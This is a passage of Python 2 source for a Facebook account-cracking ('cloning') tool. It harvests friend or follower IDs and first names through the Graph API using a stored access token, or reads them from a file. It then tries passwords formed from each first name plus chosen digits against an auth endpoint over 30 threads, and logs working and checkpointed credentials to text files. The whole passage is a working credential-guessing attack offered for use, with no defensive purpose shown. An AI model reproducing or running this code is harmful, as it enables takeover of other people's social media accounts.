    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;93mName Pass Cracking \x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public ID Cloning'
    print '\x1b[1;92m[2] Followers Cloning'
    print '\x1b[1;92m[3] File Cloning'
    print '\x1b[1;92m[0] Back'
    print 47 * '-'
    n_s()


def n_s():
    id = []
    cps = []
    oks = []
    n_s = raw_input('\x1b[1;96m=>> ')
    if n_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93mName Pass Public Cracking \x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1] Name + digit : ')
        p2 = raw_input(' \x1b[1;92m[2] Name + digit : ')
        p3 = raw_input(' \x1b[1;92m[3] Name + digit : ')
        p4 = raw_input(' \x1b[1;92m[4] Name + digit : ')
        idt = raw_input(' \x1b[1;93m[\xe2\x88\x9a] Enter id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;93mName Pass Public Cracking '
            print 47 * '-'
            print '\x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' \x1b[1;92mPress enter to try again ')
            name_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit('')[0]
            id.append(uid + '|' + nm)

    elif n_s == '2':
        os.system('clear')
        print logo
        print '\x1b[1;93mName Pass Followers Cracking \x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1] Name + digit : ')
        p2 = raw_input(' \x1b[1;92m[2] Name + digit : ')
        p3 = raw_input(' \x1b[1;92m[3] Name + digit : ')
        p4 = raw_input(' \x1b[1;92m[4] Name + digit : ')
        idt = raw_input(' \x1b[1;93m[\xe2\x88\x9a] Enter id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;93mName Pass Followers Cracking '
            print 47 * '-'
            print '\x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('\x1b[1;92mPress enter to try again ')
            name_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif n_s == '3':
        os.system('clear')
        print logo
        print '\x1b[1;93mName Pass File Cracking \x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1] Name + digit : ')
        p2 = raw_input(' \x1b[1;92m[2] Name + digit : ')
        p3 = raw_input(' \x1b[1;92m[3] Name + digit : ')
        p4 = raw_input(' \x1b[1;92m[4] Name + digit : ')
        try:
            idlist = raw_input('[+] File Name : ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            name_crack()

    elif n_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        n_s()
    print 'Total ids: ' + str(len(id))
    time.sleep(0.5)
    print '\x1b[1;97mCrack Running\x1b[1;91m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;93m     Mudasar King Of Facebook     '
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ZUBI_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass1
                cp = open('ZUBI_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('ZUBI_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass2
                    cp = open('ZUBI_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('ZUBI_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass3
                        cp = open('ZUBI_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ZUBI_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass4
                            cp = open('ZUBI_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print '\x1b[1;92mSuccessfully Done'
    print '\x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \x1b[1;93mPress enter to back')
    menu()


if __name__ == '__main__':
    reg()